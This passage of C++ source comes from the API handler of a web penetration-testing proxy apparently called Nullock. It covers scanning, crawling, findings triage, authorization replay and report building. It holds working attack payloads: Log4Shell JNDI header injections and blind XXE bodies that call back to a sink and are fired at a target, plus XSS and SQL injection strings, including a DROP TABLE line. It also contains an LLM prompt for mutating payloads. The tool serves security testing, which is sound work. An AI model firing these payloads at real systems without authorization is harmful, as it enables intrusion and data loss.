            s.request  = "GET " + (basePath + "?" + q).toUtf8() + " HTTP/1.1\r\n";
            s.request += "Host: " + host.toUtf8() + "\r\n";
            s.request += "User-Agent: Nullock/oast-blast\r\n";
            s.request += "Accept: */*\r\nConnection: close\r\n\r\n";
            shots.append(s);
        }

        // Log4Shell: inject ${jndi:ldap://<token>.<dns-host>/a} into the
        // headers most often logged (User-Agent, Referer, X-Api-Version,
        // X-Forwarded-For). A vulnerable log4j evaluates the lookup, which
        // first RESOLVES the hostname -- and that DNS query lands on our
        // DNS sink even when LDAP egress is blocked. Only fired when the
        // DNS sink is up (no DNS sink = no way to confirm it).
        const bool wantLog4shell =
            bodyJson.value("log4shell").toBool(m_wiring.dnsSink && m_wiring.dnsSink->running());
        if (wantLog4shell && m_wiring.dnsSink && m_wiring.dnsSink->running()) {
            const QString dnsHost = m_wiring.dnsSink->baseHost();
            const int dnsPort = m_wiring.dnsSink->port();
            static const char *kLog4Headers[] = {
                "User-Agent", "Referer", "X-Api-Version",
                "X-Forwarded-For", "X-Client-Ip",
            };
            for (const char *hname : kLog4Headers) {
                const QJsonObject tok = registerShot("log4shell-oast",
                    QString("header:%1").arg(QString::fromLatin1(hname)),
                    QString::fromLatin1(hname));
                const QString token = tok.value("token").toString();
                // DNS-form canary: <token>.<dns-host>. The :port is for
                // the LDAP leg; the resolver only needs the hostname.
                const QString jndi =
                    QString("${jndi:ldap://%1.%2:%3/a}").arg(token, dnsHost)
                        .arg(dnsPort);
                Shot s;
                s.kind = "log4shell-oast";
                s.note = QString("header:%1").arg(QString::fromLatin1(hname));
                s.token = token;
                s.cbUrl = QString("dns://%1.%2").arg(token, dnsHost);
                s.request  = "GET " + basePath.toUtf8()
                           + (existingQuery.isEmpty() ? QByteArray()
                                                      : "?" + existingQuery.toUtf8())
                           + " HTTP/1.1\r\n";
                s.request += "Host: " + host.toUtf8() + "\r\n";
                s.request += QByteArray(hname) + ": " + jndi.toUtf8() + "\r\n";
                s.request += "Accept: */*\r\nConnection: close\r\n\r\n";
                shots.append(s);
            }
        }

        // Blind XXE: POST an XML body whose external entity resolves to
        // our sink. Confirmation = the target's XML parser fetched it.
        if (wantXxe) {
            const QJsonObject tok = registerShot("xxe-oast", "xml-external-entity", "xml-body");
            const QString cbUrl = tok.value("pathUrl").toString();
            QByteArray xml =
                "<?xml version=\"1.0\"?>\r\n"
                "<!DOCTYPE r [<!ENTITY x SYSTEM \"" + cbUrl.toUtf8() + "\">]>\r\n"
                "<r>&x;</r>";
            Shot s;
            s.kind = "xxe-oast"; s.note = "xml-external-entity";
            s.token = tok.value("token").toString(); s.cbUrl = cbUrl;
            s.request  = "POST " + basePath.toUtf8() + " HTTP/1.1\r\n";
            s.request += "Host: " + host.toUtf8() + "\r\n";
            s.request += "User-Agent: Nullock/oast-blast\r\n";
            s.request += "Content-Type: application/xml\r\n";
            s.request += "Content-Length: " + QByteArray::number(xml.size()) + "\r\n";
            s.request += "Connection: close\r\n\r\n";
            s.request += xml;
            shots.append(s);
        }

        // Fire everything async; the response returns the fired vectors so
        // the caller can watch /api/snapshot .oast.confirmed climb.
        QList<QByteArray> requests;
        for (const Shot &s : shots) requests.append(s.request);
        (void)QtConcurrent::run([host, port, useTls, requests]() {
            Nullock::Core::HttpClient client;
            for (const QByteArray &req : requests) {
                client.send(host, static_cast<quint16>(port), useTls, req);
            }
        });

        QJsonArray vectors;
        for (const Shot &s : shots)
            vectors.append(QJsonObject{
                { "kind", s.kind }, { "note", s.note },
                { "token", s.token }, { "callbackUrl", s.cbUrl } });
        return okJson({{ "fired", static_cast<int>(shots.size()) },
                       { "target", url },
                       { "vectors", vectors }});
    }

    // ---- Session handling rules --------------------------------------
    // POST /api/session-rules/set { rules: [SessionRule, ...] }
    if (path == "/api/session-rules/set") {
        if (!m_wiring.sessionRules)
            return okJson({{ "ok", false }, { "error", "session rules not wired" }});
        QList<Nullock::Core::SessionRule> rules;
        for (const QJsonValue &v : bodyJson.value("rules").toArray()) {
            const QJsonObject o = v.toObject();
            Nullock::Core::SessionRule r;
            r.name           = o.value("name").toString();
            r.enabled        = o.value("enabled").toBool(true);
            r.hostGlob       = o.value("hostGlob").toString("*");
            r.pathGlob       = o.value("pathGlob").toString("*");
            r.extractFrom    = o.value("extractFrom").toInt(0);
            r.extractKey     = o.value("extractKey").toString();
            r.variable       = o.value("variable").toString();
            r.injectInto     = o.value("injectInto").toInt(0);
            r.injectKey      = o.value("injectKey").toString();
            r.injectTemplate = o.value("injectTemplate").toString();
            rules.append(r);
        }
        m_wiring.sessionRules->setRules(rules);
        return okJson();
    }
    if (path == "/api/session-rules/clear-vars") {
        if (m_wiring.sessionRules) m_wiring.sessionRules->clearAll();
        return okJson();
    }

    // ---- Full row fetch by id (cold-storage path) --------------------
    // GET /api/history/full/<id> -- reads the full HttpRequest +
    // HttpResponse from the SQLite store. Used by the UI when the user
    // navigates to a row that has been evicted from the in-memory
    // ProxyModel window. Returns the same shape as snapshot's row
    // entries, plus rawRequest and rawResponse pre-rendered.
    if (path.startsWith("/api/history/full/")) {
        bool ok = false;
        const int id = path.mid(QString("/api/history/full/").size()).toInt(&ok);
        if (!ok || id <= 0)
            return httpJson(400, QJsonObject{{ "error", "bad id" }});
        if (!m_wiring.projectStore)
            return httpJson(404, QJsonObject{{ "error", "no project store" }});
        auto *idx = m_wiring.projectStore->historyIndex();
        if (!idx || !idx->isOpen())
            return httpJson(503, QJsonObject{{ "error", "history index not ready" }});
        const auto fr = idx->loadFullRow(id);
        if (!fr.ok)
            return httpJson(404, QJsonObject{{ "error", "row not found" }});
        QJsonObject o;
        o["id"]     = id;
        o["method"] = fr.request.method;
        o["host"]   = fr.request.host;
        o["port"]   = fr.request.port;
        o["path"]   = fr.request.path;
        o["status"] = fr.response.statusCode;
        o["size"]   = static_cast<qint64>(fr.response.body.size());
        o["tls"]    = fr.response.wasTls;
        // Pre-render so the React UI doesn't have to reconstruct.
        const QString req = m_wiring.history
            ? m_wiring.history->requestRawById(id)
            : QString();
        const QString rsp = m_wiring.history
            ? m_wiring.history->responseRawById(id)
            : QString();
        o["rawRequest"]  = req.isEmpty() ? idx->loadFullRequestRaw(id)  : req;
        o["rawResponse"] = rsp.isEmpty() ? idx->loadFullResponseRaw(id) : rsp;
        return httpJson(200, o);
    }

    // ---- SQLite-backed history find ----------------------------------
    // POST /api/history/find { method?, host?, path?, status?, minSize?,
    //                          maxSize?, sinceMs?, limit? }
    // SQL-indexed search across every row ever captured in this
    // project. Beats scanning the in-memory ProxyModel for big histories.
    if (path == "/api/history/find") {
        if (!m_wiring.projectStore)
            return okJson({{ "ok", false }, { "error", "no project store" }});
        auto *idx = m_wiring.projectStore->historyIndex();
        if (!idx || !idx->isOpen())
            return okJson({{ "ok", false }, { "error", "history index not available" }});
        const QJsonArray rows = idx->find(bodyJson);
        QJsonObject r;
        r["rows"]  = rows;
        r["count"] = rows.size();
        return httpJson(200, r);
    }

    // ---- Crawler -----------------------------------------------------
    // POST /api/crawler/start { seed, maxPages?, maxDepth?, throttleMs? }
    if (path == "/api/crawler/start") {
        if (!m_wiring.crawler)
            return okJson({{ "ok", false }, { "error", "crawler not wired" }});
        const QString seed = bodyJson.value("seed").toString();
        const int maxPages = bodyJson.value("maxPages").toInt(200);
        const int maxDepth = bodyJson.value("maxDepth").toInt(4);
        const int throttle = bodyJson.value("throttleMs").toInt(200);
        const bool ok = m_wiring.crawler->start(seed, maxPages, maxDepth, throttle);
        return okJson({{ "ok", ok }});
    }
    if (path == "/api/crawler/stop") {
        if (m_wiring.crawler) m_wiring.crawler->stop();
        return okJson();
    }

    // ---- Findings grouped / deduped ----------------------------------
    // GET /api/findings/grouped -- collapses findings with the same
    // (kind, host) into a single entry with instance count + sample
    // rowIds. Burp shows everything; we triage.
    if (path == "/api/findings/grouped") {
        if (!m_wiring.scanner)
            return httpJson(200, QJsonObject{{ "groups", QJsonArray() }});
        // Group key: kind|host. Track count, max severity, sample rowIds,
        // first cwe/owasp/cvss (they're consistent within a kind anyway).
        struct Bucket {
            QString kind, host, severity, summary, cwe, owasp, fix;
            double  cvssMax = 0;
            int     instances = 0;
            QList<int> sampleRowIds;
        };
        QMap<QString, Bucket> buckets;
        const auto findings = m_wiring.scanner->findings(0);
        const QHash<QString, int> sevOrder = {
            {"info",0},{"low",1},{"medium",2},{"high",3},{"critical",4}
        };
        for (const auto &f : findings) {
            const QString k = f.kind + "|" + f.host;
            Bucket &b = buckets[k];
            if (b.kind.isEmpty()) {
                b.kind = f.kind; b.host = f.host;
                b.summary = f.summary; b.cwe = f.cwe; b.owasp = f.owasp;
                b.fix = f.fixSummary; b.severity = f.severity;
            }
            if (sevOrder.value(f.severity, -1) > sevOrder.value(b.severity, -1))
                b.severity = f.severity;
            if (f.cvssScore > b.cvssMax) b.cvssMax = f.cvssScore;
            ++b.instances;
            if (b.sampleRowIds.size() < 5) b.sampleRowIds.append(f.rowId);
        }
        QJsonArray arr;
        for (const Bucket &b : buckets) {
            QJsonObject o;
            o["kind"]      = b.kind;
            o["host"]      = b.host;
            o["severity"]  = b.severity;
            o["summary"]   = b.summary;
            o["instances"] = b.instances;
            o["cvssScore"] = b.cvssMax;
            o["cwe"]       = b.cwe;
            o["owasp"]     = b.owasp;
            o["fix"]       = b.fix;
            QJsonArray rids;
            for (int r : b.sampleRowIds) rids.append(r);
            o["sampleRowIds"] = rids;
            arr.append(o);
        }
        QJsonObject root; root["groups"] = arr;
        return httpJson(200, root);
    }

    // ---- AI payload generator ----------------------------------------
    // POST /api/payloads/generate { kind: "xss", count: 20,
    //                                model?: "qwen2.5:14b", ollama?: "..." }
    // Asks a local Ollama model to mutate the seed payload set into N
    // novel-but-shaped variants. Genuine differentiator: Burp's payload
    // lists are static; ours grow on demand for the target you're hitting.
    if (path == "/api/payloads/generate") {
        const QString kind   = bodyJson.value("kind").toString("xss");
        int count = bodyJson.value("count").toInt(10);
        if (count <= 0) count = 10;
        if (count > 50) count = 50;
        QString ollama = bodyJson.value("ollama").toString("http://127.0.0.1:11434");
        QString model  = bodyJson.value("model").toString("qwen2.5:14b");

        const QString prompt =
            "You generate fuzzing payloads for security testing.\n"
            "Category: " + kind + "\n"
            "Produce exactly " + QString::number(count) + " distinct payloads, one per line, "
            "no commentary, no numbering, no markdown. Each payload should be "
            "novel (try unusual encodings, alternate delimiters, edge-case characters) "
            "but still trigger the same vulnerability class.\n";

        QJsonObject ollReq;
        ollReq["model"]  = model;
        ollReq["prompt"] = prompt;
        ollReq["stream"] = false;
        const QByteArray ollBody = QJsonDocument(ollReq).toJson(QJsonDocument::Compact);

        const QUrl u(ollama + "/api/generate");
        QTcpSocket sock;
        sock.connectToHost(u.host(), static_cast<quint16>(u.port(11434)));
        if (!sock.waitForConnected(2000)) {
            // Fallback: ship a deterministic seed set per kind.
            QJsonArray fallback;
            if (kind == "xss") {
                static const char *seeds[] = {
                    "<script>alert(1)</script>",
                    "\"><svg onload=alert(1)>",
                    "javascript:alert(1)",
                    "<img src=x onerror=alert(1)>",
                    "<svg/onload=alert(1)>",
                    "<iframe src=javascript:alert(1)>",
                    "'><script>alert(1)</script>",
                };
                for (auto *s : seeds) fallback.append(QString::fromLatin1(s));
            } else if (kind == "sqli") {
                static const char *seeds[] = {
                    "' OR '1'='1", "' OR 1=1--", "\" OR \"\"=\"",
                    "'); DROP TABLE x;--", "1' UNION SELECT NULL--",
                };
                for (auto *s : seeds) fallback.append(QString::fromLatin1(s));
            } else {
                fallback.append("(no fallback list for kind=" + kind + ")");
            }
            return httpJson(200, QJsonObject{
                { "ok",        false },
                { "fallback",  true },
                { "model",     model },
                { "payloads",  fallback },
                { "error",     "ollama unreachable; returned seed list" }
            });
        }
        QByteArray req;
        req += "POST /api/generate HTTP/1.1\r\n";
        req += "Host: " + u.host().toUtf8() + ":" + QByteArray::number(u.port(11434)) + "\r\n";
        req += "Content-Type: application/json\r\n";
        req += "Content-Length: " + QByteArray::number(ollBody.size()) + "\r\n";
        req += "Connection: close\r\n\r\n";
        req += ollBody;
        sock.write(req);
        sock.waitForBytesWritten(2000);
        QByteArray resp2;
        while (sock.waitForReadyRead(15'000)) {
            resp2.append(sock.readAll());
            if (sock.state() == QAbstractSocket::UnconnectedState) break;
        }
        const int hdrEnd = resp2.indexOf("\r\n\r\n");
        const QJsonDocument d = hdrEnd > 0
            ? QJsonDocument::fromJson(resp2.mid(hdrEnd + 4))
            : QJsonDocument();
        const QString rawResponse = d.isObject()
            ? d.object().value("response").toString()
            : QString();
        QJsonArray payloads;
        for (const QString &line :
                rawResponse.split('\n', Qt::SkipEmptyParts)) {
            const QString trimmed = line.trimmed();
            if (trimmed.isEmpty()) continue;
            if (trimmed.startsWith("#")) continue;
            payloads.append(trimmed);
            if (payloads.size() >= count) break;
        }
        return httpJson(200, QJsonObject{
            { "ok",        true },
            { "model",     model },
            { "payloads",  payloads },
        });
    }

    // ---- Authorization tester (multi-user replay / IDOR) ------------
    // POST /api/authz-test {
    //   rowId: <int>,
    //   identities: [{name, headers: {Authorization, Cookie, ...}}]
    // }
    // Replays the captured request as each identity (overriding the
    // listed headers); compares responses; flags mismatches that suggest
    // BOLA / horizontal / vertical privilege issues. Burp Pro's
    // "Auth Analyzer" feature, open-sourced.
    if (path == "/api/authz-test") {
        if (!m_wiring.history)
            return okJson({{ "ok", false }, { "error", "no history" }});
        const int rid = bodyJson.value("rowId").toInt(0);
        if (rid <= 0)
            return okJson({{ "ok", false }, { "error", "rowId required" }});

        // Resolve the row -- in-memory window first, fall back to SQLite.
        Nullock::Proxy::HttpRequest baseReq;
        bool useTls = false;
        if (auto *src = m_wiring.history->requestById(rid)) {
            baseReq = *src;
            if (auto *r = m_wiring.history->responseById(rid))
                useTls = r->wasTls;
        } else if (m_wiring.projectStore) {
            auto *idx = m_wiring.projectStore->historyIndex();
            if (idx && idx->isOpen()) {
                auto fr = idx->loadFullRow(rid);
                if (fr.ok) { baseReq = std::move(fr.request); useTls = fr.response.wasTls; }
            }
        }
        if (baseReq.host.isEmpty())
            return okJson({{ "ok", false }, { "error", "row not found" }});

        const QJsonArray ids = bodyJson.value("identities").toArray();
        if (ids.isEmpty())
            return okJson({{ "ok", false }, { "error", "identities[] required" }});

        Nullock::Core::HttpClient client;
        QJsonArray results;
        for (const QJsonValue &iv : ids) {
            const QJsonObject id = iv.toObject();
            const QString name = id.value("name").toString();
            const QJsonObject headers = id.value("headers").toObject();
            // Build a new request: clone baseReq, overlay headers.
            Nullock::Proxy::HttpRequest req = baseReq;
            QList<QPair<QString, QString>> filtered;
            QSet<QString> overrideKeys;
            for (const QString &k : headers.keys())
                overrideKeys.insert(k.toLower());
            // Drop existing same-name headers we're overriding.
            for (const auto &h : baseReq.headers) {
                if (overrideKeys.contains(h.first.toLower())) continue;
                filtered.append(h);
            }
            for (const QString &k : headers.keys())
                filtered.append({ k, headers.value(k).toString() });
            req.headers = filtered;

            const QByteArray bytes = Nullock::Proxy::serializeRequestForOrigin(req);
            const auto res = client.send(req.host,
                static_cast<quint16>(req.port), useTls, bytes);
            QJsonObject r;
            r["identity"]   = name;
            r["ok"]         = res.ok;
            r["status"]     = res.ok ? res.parsed.statusCode : 0;
            r["bodySize"]   = res.ok ? static_cast<qint64>(res.parsed.body.size()) : 0;
            r["error"]      = res.ok ? QString() : res.errorMessage;
            results.append(r);
        }

        // Compare across identities: if statuses or bodySizes diverge,
        // flag a finding. Same-shape = consistent access control.
        QSet<int> distinctStatuses;
        QSet<qint64> distinctSizes;
        for (const QJsonValue &v : results) {
            const QJsonObject r = v.toObject();
            if (r.value("ok").toBool()) {
                distinctStatuses.insert(r.value("status").toInt());
                distinctSizes.insert(static_cast<qint64>(r.value("bodySize").toDouble()));
            }
        }
        const bool divergent = distinctStatuses.size() > 1
                            || distinctSizes.size() > 1;
        if (divergent && m_wiring.scanner) {
            m_wiring.scanner->reportFinding(rid, "high", "authz-divergence",
                "Multi-identity replay shows divergent responses (BOLA / horizontal / vertical privilege candidate)",
                "statuses=" + [&]{
                    QStringList ss;
                    for (int s : distinctStatuses) ss.append(QString::number(s));
                    return ss.join(",");
                }() +
                " · sizes=" + [&]{
                    QStringList ss;
                    for (qint64 s : distinctSizes) ss.append(QString::number(s));
                    return ss.join(",");
                }(),
                baseReq.host,
                (useTls ? "https://" : "http://") + baseReq.host + baseReq.path);
        }
        return httpJson(200, QJsonObject{
            { "ok",        true },
            { "divergent", divergent },
            { "results",   results },
            { "row",       rid },
        });
    }

    // ---- Sequencer (token randomness analyzer) -----------------------
    // POST /api/sequencer/analyze { tokens: [str, str, ...] }
    // Burp's Sequencer equivalent. Statistical tests on a captured
    // corpus of session-style tokens. Returns per-test scores + verdict.
    if (path == "/api/sequencer/analyze") {
        QStringList tokens;
        for (const QJsonValue &v : bodyJson.value("tokens").toArray())
            tokens.append(v.toString());
        Nullock::Core::Sequencer seq;
        return httpJson(200, seq.analyze(tokens));
    }

    // ---- Reverse OpenAPI ---------------------------------------------
    // GET /api/openapi/export -- walks captured history and synthesizes
    // an OpenAPI 3.1 spec describing every (host, path, method) seen.
    // Per-operation metadata is intentionally light -- response codes
    // are collected as `responses: { code: { description } }`, no
    // schemas. Real use is: pipe this into a code-gen tool, or hand
    // to a developer as "here's the surface I saw, please document it."
    if (path == "/api/openapi/export") {
        if (!m_wiring.projectStore)
            return httpJson(404, QJsonObject{{ "error", "no project store" }});
        auto *idx = m_wiring.projectStore->historyIndex();
        if (!idx || !idx->isOpen())
            return httpJson(503, QJsonObject{{ "error", "history index not ready" }});

        // hostKey = (scheme, host, port). For each, collect path -> method -> set<status>.
        struct OpInfo {
            QSet<int> statuses;
            QStringList mimes;
        };
        QMap<QString, QMap<QString, QMap<QString, OpInfo>>> byHost;
        for (int id : idx->allIds()) {
            auto fr = idx->loadFullRow(id);
            if (!fr.ok) continue;
            if (fr.request.method.startsWith("WS")) continue;
            const QString scheme  = fr.response.wasTls ? "https" : "http";
            const QString hostKey = scheme + "://" + fr.request.host
                + (fr.request.port == (fr.response.wasTls ? 443 : 80)
                    ? QString()
                    : ":" + QString::number(fr.request.port));
            QString pathOnly = fr.request.path;
            const int q = pathOnly.indexOf('?');
            if (q >= 0) pathOnly = pathOnly.left(q);
            auto &op = byHost[hostKey][pathOnly][fr.request.method.toLower()];
            op.statuses.insert(fr.response.statusCode);
        }
        QJsonObject spec;
        spec["openapi"] = "3.1.0";
        QJsonObject info;
        info["title"]   = "Reverse-engineered from Nullock capture";
        info["version"] = "0.0.0";
        spec["info"] = info;
        QJsonArray servers;
        for (auto hit = byHost.cbegin(); hit != byHost.cend(); ++hit) {
            QJsonObject s; s["url"] = hit.key(); servers.append(s);
        }
        spec["servers"] = servers;
        QJsonObject paths;
        for (auto hit = byHost.cbegin(); hit != byHost.cend(); ++hit) {
            for (auto pit = hit->cbegin(); pit != hit->cend(); ++pit) {
                QJsonObject pathObj = paths.value(pit.key()).toObject();
                for (auto mit = pit->cbegin(); mit != pit->cend(); ++mit) {
                    QJsonObject responses;
                    for (int st : mit->statuses) {
                        QJsonObject r;
                        r["description"] = QString("observed status %1").arg(st);
                        responses[QString::number(st)] = r;
                    }
                    // If this (path, method) was already seen on a
                    // different host, MERGE rather than clobber: tack
                    // the new host onto x-nullock-hosts (array) and
                    // union the response codes.
                    QJsonObject op = pathObj.value(mit.key()).toObject();
                    QJsonArray  hosts = op.value("x-nullock-hosts").toArray();
                    if (!hosts.contains(QJsonValue(hit.key())))
                        hosts.append(hit.key());
                    op["x-nullock-hosts"] = hosts;
                    QJsonObject existingResp = op.value("responses").toObject();
                    for (const QString &code : responses.keys())
                        existingResp[code] = responses.value(code);
                    op["responses"] = existingResp;
                    pathObj[mit.key()] = op;
                }
                paths[pit.key()] = pathObj;
            }
        }
        spec["paths"] = paths;
        return httpJson(200, spec);
    }

    // ---- AI-assisted finding triage ----------------------------------
    // POST /api/triage/finding { rowId, kind, severity, summary, evidence }
    //   ?model=qwen2.5:14b (default)
    //   ?ollama=http://127.0.0.1:11434 (default)
    // Asks a local Ollama model to grade impact / suggest fix / flag
    // false-positive risk. Fire-and-forget over HTTP to Ollama's
    // /api/generate. Falls back to a heuristic if Ollama isn't running.
    if (path == "/api/triage/finding") {
        QString ollama = "http://127.0.0.1:11434";
        QString model  = "qwen2.5:14b";
        if (!query.isEmpty()) {
            const QUrlQuery q(query);
            if (!q.queryItemValue("ollama").isEmpty()) ollama = q.queryItemValue("ollama");
            if (!q.queryItemValue("model").isEmpty())  model  = q.queryItemValue("model");
        }
        const QString summary  = bodyJson.value("summary").toString();
        const QString kind     = bodyJson.value("kind").toString();
        const QString severity = bodyJson.value("severity").toString();
        const QString evidence = bodyJson.value("evidence").toString();
        // Optional context: rowId pulls the captured request/response
        // raw text and inlines them so the model has the real payload.
        QString rawCtx;
        const int rowId = bodyJson.value("rowId").toInt(0);
        if (rowId > 0 && m_wiring.history) {
            const QString req  = m_wiring.history->requestRawById(rowId);
            const QString resp = m_wiring.history->responseRawById(rowId);
            if (!req.isEmpty())  rawCtx += "\n\n--- captured request ---\n" + req.left(8 * 1024);
            if (!resp.isEmpty()) rawCtx += "\n\n--- captured response ---\n" + resp.left(8 * 1024);
        }
        const QString prompt =
            "You are a senior application security analyst. Triage this "
            "finding from a passive proxy scan. Be concise (under 200 "
            "words). Cover: real impact, suggested fix in one line, and "
            "false-positive likelihood as low/med/high.\n\n"
            "kind: " + kind + "\nseverity: " + severity +
            "\nsummary: " + summary + "\nevidence: " + evidence + rawCtx;

        QJsonObject ollamaReq;
        ollamaReq["model"]   = model;
        ollamaReq["prompt"]  = prompt;
        ollamaReq["stream"]  = false;
        const QByteArray ollamaBody = QJsonDocument(ollamaReq).toJson(QJsonDocument::Compact);

        // Crude HTTP/1.1 POST to Ollama. Synchronous; the snapshot
        // poll has its own timeout so the user sees the spinner.
        const QUrl u(ollama + "/api/generate");
        QTcpSocket sock;
        sock.connectToHost(u.host(), static_cast<quint16>(u.port(11434)));
        if (!sock.waitForConnected(2000)) {
            QJsonObject r;
            r["ok"]     = false;
            r["error"]  = "ollama unreachable at " + ollama;
            r["model"]  = model;
            r["triage"] = "(heuristic) " + severity.toUpper() + ": " + summary
                + " -- evidence suggests "
                + (severity == "critical" || severity == "high"
                    ? "real impact; verify and patch"
                    : "low-impact informational; deprioritize")
                + ". Fix: see kind=" + kind + " docs.";
            return httpJson(200, r);
        }
        QByteArray req;
        req += "POST /api/generate HTTP/1.1\r\n";
        req += "Host: " + u.host().toUtf8() + ":" + QByteArray::number(u.port(11434)) + "\r\n";
        req += "Content-Type: application/json\r\n";
        req += "Content-Length: " + QByteArray::number(ollamaBody.size()) + "\r\n";
        req += "Connection: close\r\n\r\n";
        req += ollamaBody;
        sock.write(req);
        sock.waitForBytesWritten(2000);
        QByteArray resp;
        while (sock.waitForReadyRead(15'000)) {
            resp.append(sock.readAll());
            if (sock.state() == QAbstractSocket::UnconnectedState) break;
        }
        const int hdrEnd = resp.indexOf("\r\n\r\n");
        const QJsonDocument d = hdrEnd > 0
            ? QJsonDocument::fromJson(resp.mid(hdrEnd + 4))
            : QJsonDocument();
        QJsonObject r;
        r["ok"]     = true;
        r["model"]  = model;
        r["triage"] = d.isObject()
            ? d.object().value("response").toString()
            : QString("(empty response from ollama)");
        return httpJson(200, r);
    }

    // ---- Cookie tomography -------------------------------------------
    // GET /api/cookies -- inventory of every cookie captured per host
    // with security flag breakdown. Replaces the diff'ing that pen-testers
    // do by hand when a target sets dozens of cookies across login.
    if (path == "/api/cookies") {
        if (!m_wiring.sessions)
            return httpJson(200, QJsonObject{{ "hosts", QJsonArray() }});
        QJsonArray hosts;
        for (const auto &h : m_wiring.sessions->sessions()) {
            QJsonObject hostObj;
            hostObj["host"]       = h.host;
            hostObj["lastSeenMs"] = static_cast<double>(h.lastSeen);
            hostObj["autoInject"] = h.autoInject;
            QJsonArray cookies;
            int httpOnlyCnt = 0, secureCnt = 0, sameSiteCnt = 0;
            for (const auto &c : h.cookies) {
                QJsonObject co;
                co["name"]     = c.name;
                co["valueLen"] = c.value.size();
                co["path"]     = c.path;
                co["expires"]  = c.expires;
                co["httpOnly"] = c.httpOnly;
                co["secure"]   = c.secure;
                co["sameSite"] = c.sameSite;
                if (c.httpOnly) ++httpOnlyCnt;
                if (c.secure)   ++secureCnt;
                if (!c.sameSite.isEmpty()) ++sameSiteCnt;
                cookies.append(co);
            }
            hostObj["cookies"]      = cookies;
            hostObj["count"]        = cookies.size();
            hostObj["httpOnlyPct"]  = cookies.size()
                ? int(100 * httpOnlyCnt / cookies.size()) : 0;
            hostObj["securePct"]    = cookies.size()
                ? int(100 * secureCnt   / cookies.size()) : 0;
            hostObj["sameSitePct"]  = cookies.size()
                ? int(100 * sameSiteCnt / cookies.size()) : 0;
            hosts.append(hostObj);
        }
        QJsonObject root; root["hosts"] = hosts;
        return httpJson(200, root);
    }

    // ---- Project templates -------------------------------------------
    // GET /api/project/templates -- list available templates
    // POST /api/project/create-from-template { templateId, projectName }
    if (path == "/api/project/templates") {
        QStringList searchDirs;
        searchDirs << (m_wiring.uiDir + "/../templates/projects");
        searchDirs << (QCoreApplication::applicationDirPath()
                       + "/../../../../templates/projects");
        searchDirs << (QCoreApplication::applicationDirPath()
                       + "/../share/nullock/templates/projects");
        QJsonArray arr;
        QSet<QString> seenIds;
        for (const QString &dir : searchDirs) {
            if (!QFileInfo::exists(dir)) continue;
            for (const QString &f : QDir(dir).entryList({"*.json"}, QDir::Files)) {
                QFile fp(dir + "/" + f);
                if (!fp.open(QIODevice::ReadOnly)) continue;
                const QJsonDocument d = QJsonDocument::fromJson(fp.readAll());
                if (!d.isObject()) continue;
                const QJsonObject o = d.object();
                const QString id = o.value("id").toString();
                if (id.isEmpty() || seenIds.contains(id)) continue;
                seenIds.insert(id);
                QJsonObject summary;
                summary["id"]          = id;
                summary["name"]        = o.value("name").toString();
                summary["description"] = o.value("description").toString();
                summary["inScope"]     = o.value("inScope");
                summary["outOfScope"]  = o.value("outOfScope");
                summary["extensionsEnabled"] = o.value("extensionsEnabled");
                arr.append(summary);
            }
        }
        QJsonObject root; root["templates"] = arr;
        return httpJson(200, root);
    }
    if (path == "/api/project/create-from-template") {
        if (!m_wiring.projectStore)
            return okJson({{ "ok", false }, { "error", "no project store" }});
        const QString tplId = bodyJson.value("templateId").toString();
        const QString name  = bodyJson.value("projectName").toString();
        if (tplId.isEmpty() || name.isEmpty())
            return okJson({{ "ok", false }, { "error",
                                              "templateId and projectName required" }});
        QStringList searchDirs;
        searchDirs << (m_wiring.uiDir + "/../templates/projects");
        searchDirs << (QCoreApplication::applicationDirPath()
                       + "/../../../../templates/projects");
        searchDirs << (QCoreApplication::applicationDirPath()
                       + "/../share/nullock/templates/projects");
        QJsonObject tplObj;
        for (const QString &dir : searchDirs) {
            const QString fpath = dir + "/" + tplId + ".json";
            if (!QFileInfo::exists(fpath)) continue;
            QFile fp(fpath);
            if (!fp.open(QIODevice::ReadOnly)) continue;
            const QJsonDocument d = QJsonDocument::fromJson(fp.readAll());
            if (d.isObject()) { tplObj = d.object(); break; }
        }
        if (tplObj.isEmpty())
            return okJson({{ "ok", false }, { "error", "template not found: " + tplId }});

        if (!m_wiring.projectStore->createProject(name))
            return okJson({{ "ok", false }, { "error", "createProject failed" }});

        // Apply template metadata on top of the empty project.
        QStringList inS;
        for (const auto &v : tplObj.value("inScope").toArray()) inS.append(v.toString());
        QStringList outS;
        for (const auto &v : tplObj.value("outOfScope").toArray()) outS.append(v.toString());
        m_wiring.projectStore->setInScope(inS);
        m_wiring.projectStore->setOutOfScope(outS);
        m_wiring.projectStore->setNotes(tplObj.value("notes").toString());
        return okJson({{ "ok", true }, { "project", name },
                       { "applied", tplId }});
    }

    // ---- Report builder ----------------------------------------------
    // POST /api/report/build -- produces a Markdown engagement report
    // from findings + scope + notes + session metadata. Useful as a
    // first-pass draft the user can hand to their report-writing
    // pipeline.
    if (path == "/api/report/build") {
        QString out;
        const QString proj = m_wiring.projectStore
            ? m_wiring.projectStore->metadata().name : QStringLiteral("default");
        out += "# Nullock engagement report -- " + proj + "\n\n";
        out += "*Generated " + QDateTime::currentDateTime().toString(Qt::ISODate) + "*\n\n";

        out += "## Scope\n\n";
        if (m_wiring.projectStore) {
            const auto meta = m_wiring.projectStore->metadata();
            out += "**In-scope hosts:**\n";
            for (const auto &s : meta.inScope) out += "- `" + s + "`\n";
            if (meta.inScope.isEmpty()) out += "_(no hosts configured)_\n";
            out += "\n**Out-of-scope hosts:**\n";
            for (const auto &s : meta.outOfScope) out += "- `" + s + "`\n";
            if (meta.outOfScope.isEmpty()) out += "_(none)_\n";
            out += "\n";
            if (!meta.notes.isEmpty()) {
                out += "## Notes\n\n";
                out += meta.notes + "\n\n";
            }
        }

        out += "## Findings\n\n";
        if (m_wiring.scanner) {
            const auto findings = m_wiring.scanner->findings(0);
            // Group by severity, descending.
            QMap<QString, QList<Nullock::Core::Finding>> bySev;
            const QStringList severityOrder = {"critical", "high", "medium", "low", "info"};
            for (const auto &f : findings) bySev[f.severity.toLower()].append(f);
            for (const QString &sev : severityOrder) {
                if (!bySev.contains(sev)) continue;
                out += "### " + sev.toUpper() + " (" +
                       QString::number(bySev[sev].size()) + ")\n\n";
                for (const auto &f : bySev[sev]) {
                    out += "- **" + f.kind + "** at " + f.host + " — " + f.summary + "\n";
                    if (!f.url.isEmpty()) out += "  - URL: `" + f.url + "`\n";
                    if (!f.evidence.isEmpty()) {
                        out += "  - Evidence: `" + f.evidence.left(200) + "`\n";
                    }
                }
                out += "\n";
            }
            out += "Total findings: **" + QString::number(findings.size()) + "**\n\n";
        } else {
            out += "_(scanner not wired)_\n\n";
        }

